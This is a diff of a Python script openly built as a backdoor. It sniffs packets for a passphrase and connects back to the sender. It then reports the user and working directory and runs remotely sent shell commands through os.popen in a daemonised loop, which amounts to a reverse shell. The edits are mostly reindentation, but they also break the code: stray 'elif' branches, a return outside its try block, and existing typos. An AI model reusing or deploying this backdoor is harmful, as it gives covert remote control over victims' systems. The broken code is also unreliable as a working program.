@@ -29,14 +29,14 @@ def BackdoorSniffer():
         dataSize = len(pkt) - hSize
         data  = pkt[hSize:]
         try:
-                if type(data) == bytes:
-                    data = data.decode("utf-8")
-                if data == "passphrase1":
-                    if type (saddr) == bytes:
-                        saddr = saddr.decpde("utf-8")
-                    if type(sport) == bytes:
-                        sport = sport.decode("utf-8")
-                    return saddr, sport, daddr, dport
+            if type(data) == bytes:
+                data = data.decode("utf-8")
+            elif data == "passphrase1":
+                if type (saddr) == bytes:
+                    saddr = saddr.decpde("utf-8")
+                elif type(sport) == bytes:
+                    sport = sport.decode("utf-8")
+        return saddr, sport, daddr, dport
         except:
             pass
 
@@ -44,18 +44,19 @@ def BackdoorInit():
 
     skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     daddr, dport, saddr, sport = BackdoorSniffer()
+    
     try:
-            skt.bind((saddr, sport))
-            skt.connect((daddr, dport))
-
+        skt.bind((saddr, sport))
+        skt.connect((daddr, dport))
+        
     except:
-            return None
+        return None
     command = skt.recv(1024)
+    
     if type(command)==bytes:
         command=command.decode("utf-8")
-    if command.strip() == "passphrase2":
+    elif command.strip() == "passphrase2":
         skt.send(b"passphrase3")
-
         return skt
     else:
         return None
@@ -66,7 +67,7 @@ def BackdoorGetSystemInfo(skt):
     prompt = []
     if type(command) == bytes:
         command=command.decode("utf-8")
-    if command.strip() == "Report":
+    elif command.strip() == "Report":
         p = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out, err = p.communicate()
         user  = out.strip().decode("utf-8")
@@ -79,9 +80,9 @@ def BackdoorGetSystemInfo(skt):
         prompt = "".join(prompt)
         skt.send(str.encode(prompt))
     command = skt.recv(1024)
-    if type(command) == bytes:
+    elif type(command) == bytes:
         command=command.decode("utf-8")
-    if command.strip() == "Location":
+    elif command.strip() == "Location":
         proc = os.popen("pwd")
         location  = ""
         for i in proc.readlines():
@@ -93,38 +94,37 @@ def BackdoorGetSystemInfo(skt):
 def BackdoorCmd(skt, command):
 
     try:
-            proc = os.popen(command)
-            output  = ""
-            for i in proc.readlines():
-                output += i
-            output = outputstrip()
-            if output == "":
-                output = "daemonnoreport"
-            skt.send(str.encode(output))
+        proc = os.popen(command)
+        output  = ""
+        for i in proc.readlines():
+            output += i
+        output = outputstrip()
+        if output == "":
+            output = "daemonnoreport"
+        skt.send(str.encode(output))
     except Exception as err:
         print(err.args)
         skt.send(str.encode("Error : command '" + command+ "' not found"))
 
 def BackdoorShell(skt):
     while True:
-        
         try:
-                command = skt.recv(1024)
-                if type(command)==bytes:
-                    command=command.decode("utf-8")
-                if command.strip().split()[0] == "cd":
-                    os.chdir(command.strip("cd"))
-                    BackdoorCmd(skt, "pwd")
-                elif command.strip().lower()  == "exit":
-                    skt.send(b"exited")
-                    skt.close()
-                    break
-                elif command.strip().lower() == "release":
-                    skt.send(b"released")
-                    skt.close()
-                    return False
-                else:
-                    BackdoorCmd(skt, command)
+            command = skt.recv(1024)
+            if type(command)==bytes:
+                command=command.decode("utf-8")
+            if command.strip().split()[0] == "cd":
+                os.chdir(command.strip("cd"))
+                BackdoorCmd(skt, "pwd")
+            elif command.strip().lower()  == "exit":
+                skt.send(b"exited")
+                skt.close()
+                break
+            elif command.strip().lower() == "release":
+                skt.send(b"released")
+                skt.close()
+                return False
+            else:
+                BackdoorCmd(skt, command)
         except Exception:
                 skt.send(b"Error : An unexpected error has occurred.")
     return True
@@ -145,7 +145,6 @@ def daemonize():
     stderr='/dev/null'
 
     try:
-
         pid = os.fork()
         if pid > 0:
             sys.exit(0)
